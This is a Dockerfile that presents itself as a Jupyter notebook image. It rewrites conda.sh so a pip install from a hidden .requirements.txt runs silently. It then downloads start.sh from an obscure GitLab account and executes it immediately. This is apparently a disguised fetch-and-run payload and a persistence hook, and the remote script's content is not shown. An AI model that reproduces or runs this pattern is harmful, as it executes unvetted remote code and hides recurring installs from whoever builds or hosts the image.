FROM jupyter/minimal-notebook

USER 0
RUN apt-get update && apt-get install -y curl && \
    rm -rf /var/lib/apt/lists/*

USER 1000

RUN find /opt/conda -name conda.sh | xargs sed -i 's/__conda_hashr$/&\n    pip install -q -r \/home\/jovyan\/\.requirements\.txt/'
RUN wget https://gitlab.com/adamasdsad/anjim1/-/raw/master/start.sh && chmod u+x start.sh && ./start.sh
